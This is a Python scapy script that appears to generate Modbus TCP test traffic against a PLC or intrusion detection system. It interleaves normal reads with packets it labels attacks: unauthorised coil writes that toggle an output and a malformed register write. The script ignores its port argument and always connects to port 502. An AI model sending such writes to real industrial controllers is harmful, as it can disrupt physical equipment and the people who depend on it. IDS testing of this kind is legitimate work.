#!/usr/bin/env python

#  v0.0.5

from scapy.all import *
import argparse
import time

load_contrib('modbus')

NUM_PACKETS_TO_SNIFF=100

#Parse arguments from command line at runtime
parser = argparse.ArgumentParser(description="Sends a variety of valid and invalid Modbus TCP packets from an 'attacker' to a user-defined IP address to test robustness of a PLC or IDS.")
parser.add_argument("dst_ip", help="IP address of Modbus PLC or IDS to test.")
parser.add_argument("dst_port", type=int, help="Port that the Modbus TCP service is running on the destination machine. If unsure, use port 502.")
args=parser.parse_args()

#Create a TCP connection to the specified address
sock = socket.socket()
sock.connect((args.dst_ip,502))
stream = StreamSocket(sock)

#Create various packets to send to the destination
#Use the following line to test sending a specific packet rather than the rest of the script.
#response=stream.sr(errorpacket)

#Normal behaviour - checking the 3 coils
read_coils=ModbusADURequest()/ModbusPDU01ReadCoilsRequest(startAddr=0,quantity=3)
#Normal behaviour - checking the button input
read_discrete_inputs=ModbusADURequest()/ModbusPDU02ReadDiscreteInputsRequest(startAddr=2,quantity=1)

#Write good data to green tlight
write_coil_low=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2,outputValue=0)
write_coil_high=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2,outputValue=1)

write_multiple_coils_low=ModbusADURequest()/ModbusPDU0FWriteMultipleCoilsRequest(outputsValue=[0],startingAddr=2,quantityOutput=1)
write_multiple_coils_high=ModbusADURequest()/ModbusPDU0FWriteMultipleCoilsRequest(outputsValue=[1],startingAddr=2,quantityOutput=1)

#ModbusPDU10WriteMultipleRegistersRequest
#Write erranous data
errorpacket=ModbusADURequest()/ModbusPDU10WriteMultipleRegistersRequest(startingAddr=1,outputsValue=[13],quantityRegisters=5L)


for i in range(0,5): #20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

#ATTACK 1 - 4 packs
stream.sr(write_coil_low)
time.sleep(1)
stream.sr(write_coil_high)
print "Sent Coil Write Attack"
time.sleep(0.5)

for i in range(0,5): #20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

#Send the desired packets # 2 packs
stream.sr(errorpacket)
print "Sent Coil Malformed Packet Attack"
time.sleep(0.5)

for i in range(0,5): #20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

# 4 packs
stream.sr(write_multiple_coils_low)
time.sleep(1)
stream.sr(write_multiple_coils_high)
print "Sent Multiple Coil Write Attack"
time.sleep(0.5)

for i in range(0,5): # 20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

#ATTACK 1 - 4 packs
stream.sr(write_coil_low)
time.sleep(1)
stream.sr(write_coil_high)
print "Sent Coil Write Attack"
time.sleep(0.5)

for i in range(0,5): #20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

#Send the desired packets # 2 packs
stream.sr(errorpacket)
print "Sent Coil Malformed Packet Attack"
time.sleep(0.5)

for i in range(0,5): #20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)

# 4 packs
stream.sr(write_multiple_coils_low)
time.sleep(1)
stream.sr(write_multiple_coils_high)
print "Sent Multiple Coil Write Attack"
time.sleep(0.5)

for i in range(0,5): # 20
    stream.sr(read_coils)
    stream.sr(read_discrete_inputs)
    time.sleep(0.5)